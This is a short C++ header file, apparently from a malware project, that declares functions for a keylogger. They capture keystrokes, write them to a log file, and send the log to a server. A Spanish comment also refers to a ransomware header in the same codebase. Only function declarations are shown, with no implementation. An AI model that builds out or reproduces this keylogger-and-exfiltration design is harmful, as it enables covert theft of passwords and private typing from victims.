// keylogger.h
#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <string>
#include <atomic>

// Se asume que la función getCharFromKey es la única función en el archivo .cpp
// que no está cubierta por otros archivos de encabezado como utils.h, ransomware.h, etc.

char getCharFromKey(int key, bool shiftPressed, bool altGrPressed);
void sendKeylogToServer(const std::string& logFilePath);
void logKeyStrokes(const std::string& logFilePath, bool keysState[], std::atomic<bool>& running);
#endif // KEYLOGGER_H
